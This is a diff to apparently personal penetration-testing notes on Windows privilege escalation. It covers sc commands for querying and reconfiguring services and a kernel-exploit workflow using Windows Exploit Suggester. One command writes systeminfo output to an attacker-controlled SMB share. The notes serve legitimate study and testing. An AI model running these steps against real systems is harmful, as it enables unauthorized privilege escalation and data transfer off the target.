@@ -77,6 +77,40 @@ open new cmd
 ```
 .\winPEAS.exe
 ```
+## Service Exploit
+### Important Services Commands
+- Query configurations of service
 ```
-.\winPEAS.exe
+sc qc <svc name>
 ```
+- Query current status of service
+```
+sc query <svc name>
+```
+- Modify an option in the servce
+```
+sc config <svc name> <option>=<value>
+```
+- Start/stop a service
+```
+sc start/stop <svc name>
+```
+
+
+
+## Kernel Exploit (Last resort)
+### Tools
+1. Windows Exploit Suggester (wes)
+2. Precompiled Kernel Exploits
+3. Watson (For more recent Windows version)
+### Technique
+- See if ```systeminfo``` results show older unpatched windows and find relevant exploit for it.
+
+1. Run ```systeminfo > \\10.13.47.80\kali\systeminfo.txt``` on the windows terminal to transfer systeminfo to kali SMB.
+2. Run this in kali terminal
+```
+python wes.py /kali/systeminfo.txt -i 'Elevation of Privilege' --exploit-only | more
+```
+3. Cross reference all the CVE results with the Precompiled Kernel Exploits list.
+4. If cant find, go search in exploit-db
+
